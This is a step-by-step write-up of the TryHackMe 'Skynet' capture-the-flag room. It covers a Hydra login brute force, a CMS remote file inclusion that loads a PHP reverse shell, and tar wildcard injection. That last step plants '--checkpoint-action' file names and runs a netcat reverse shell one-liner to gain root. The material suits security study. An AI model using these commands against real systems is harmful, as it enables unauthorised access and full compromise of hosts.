# Skynet THM Room


This is a quick writeup or another "just-me-taking-notes" thing for Skynet TryhackMe's room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)

Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/skynet).
- **PLEASE NOTE:** Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.
- Donwload Autorecon by clicking [this](https://github.com/Tib3rius/AutoRecon) link.


[Task 1] Deploy and compromise the vulnerable machine!

We get a very interesting list of possible passwords? usernames? from the **log1.txt** file and as per the **attention.txt** we know the sysadmin requested all users to change passwords.



if we visit the **/squirrelmail** URL we get a webmail login form, let's try our luck with hydra:


We need to capture a login request, I used Burp but you can even when this directly from the Browser. The request gives us all we need to attempt to brute force our way into **Squirrelmail**.

```sh
POST /squirrelmail/src/redirect.php HTTP/1.1
Host: 10.10.180.3

Connection: close

login_username=test&secretkey=test&js_autodetect_results=1&just_logged_in=1
```

Using the information from the request we form our command for **hydra**:

```sh
hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect'
```

The attack result is the following:

```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/THM/skynet]
â””â”€$ hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect'

```

With this result we can answer the first question of the room. **(milesdyson:{PASSWORD_REDACTED})**

If we log into the email with Miles' credentials, we see some emails:

![Miles emails](https://i.imgur.com/ZCY4EJy.png)


It seems Miles' password has been reset due to a system malfunction:

```sh
We have changed your smb password after system malfunction.
Password: {PASSWORD_REDACTED}
```

We also see some other emails with binary information:

![Miles emails binary](https://i.imgur.com/Ew19QQx.png)

We'll download a copy of this in case it comes in handy later on, the third and last email is also quite odd:

![Miles third email](https://i.imgur.com/C0Va2rs.png)


I've looked into that binary email and translates to some nonsense for now. Let's try to connect to that SMB as Miles, shall we?

```

once we connect to Miles' SMB private share, we can see a file called **important.txt** which gives us some useful information:

```sh
1. Add features to beta CMS /{URL_REDACTED}
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

This file let us answer some more questions.

If we access the CMS URL mentioned in that note we get Miles' personal page, some sort of about page:

![Miles Personal Page](https://i.imgur.com/UwK0SiJ.png)


- Note: I'll also keep a copy of Miles Picture, just in case there is something hidden on it.

Since we know have discovered a weirdly named new directory, let's run **goBuster** on that to see if we get anything else under that path:

```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/THM/skynet]

```
After a little while, we get a partial result. There is an administration page that we can look at:

![CMS Login Page](https://i.imgur.com/re6i8Bb.png)

Thanks to this login page, we get some details about the CMS version running. With that we can search for a possible exploit:

```sh

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ subl /usr/share/exploitdb/exploits/php/webapps/25971.txt


```

We see there is a RFI vulnerability that we could possibly exploit. Let's open the exploit to see what it does.
It seems thre is that **/alertConfigField.php** that can be exploited by adding some payload to the URL:

```sh
http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
```
- [FI] indicates we can add a File Inclusion here, since a bit of code in the **/alertConfigField.php** file would actually load files.

We'll download a PHP reverse shell that we can use to get access to the machine:

- **Basic PHP Reverse Shell**: Click [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to download.

The exploit only needs two values changed, our tun0 IP and Port:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.13.0.34';  // CHANGE THIS
$port = 2112;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

- More info on the port selected [here](https://youtu.be/AZm1_jtY1SQ) :)

Ok with the exploit ready let's fire up a python HTTP server to make it available:

```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/THM/skynet/php-reverse-shell-1.0]
â””â”€$ python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...

```
Now we need to create a netcat listener to hopefully get our reverse shell:

```sh
kali@kali:~$ nc -nlvp 2112
listening on [any] 2112 ...

```

I think we are ready to try to load our payload using the URL:

```sh
/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.0.34:8000/revShell.php?
```

Once we run that URL on the Browser, we see our reverse shell is served and executed successfully:

```sh
kali@kali:~$ nc -nlvp 2112
listening on [any] 2112 ...
connect to [10.13.0.34] from (UNKNOWN) [10.10.136.30] 44250
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

$ cd home
$ ls

$ cd milesdyson
$ dir

$ cat user.txt

$ 

```

With this access we should be able to read the user flag.


To move forward with this privesc, we need to get some more information from the system.
We put **linPEAS.sh** into our local HTTP server folder and using **wget** on the connected session we donwload it into the target machine.


Looking at the report from linPEAS, we see a possible exploitation for the Linux Kernel:

```sh
/usr/bin/pkexec         --->    Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
```

We see we have a gcc exploit available [here](https://github.com/jas502n/CVE-2019-13272)

However, if we check the cronjobs we can see there is a job running that we could try to exploit:

```sh
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

let's see what this sh file is about:

```bash
$ cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

apparently this copies the whole HTML directory and somehow the wildcards passed to **tar** can be exploited...
At this point my brain almost stopped working. 

This is from THMs post:

Well, believe it or not, this creates a vulnerability as we can use it to  execute code. HelpNetSecurity best explains how this vulnerability works, but in essence, tar has wildcards and we can use checkpoint actions to execute commands.

```sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.34 2113 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

So running these commands we leverage tar's checkpoints and we can execute arbitrary code as root. Sweet!
Let's try it out!

```sh
$ cd /var/www/html
$ ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
style.css
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.34 2113 >/tmp/f" > shell.sh
$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
$ touch "/var/www/html/--checkpoint=1"

```

and we get our root shell!!


```sh
â”Œâ”€â”€(kaliã‰¿kali)-[/opt/privilege-escalation-awesome-scripts-suite/linPEAS]
â””â”€$ nc -nlvp 2113
listening on [any] 2113 ...
connect to [10.13.0.34] from (UNKNOWN) [10.10.136.30] 54234
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
{ROOT_FLAG_REDACTED}
# 

```

As usual, happy hacking.
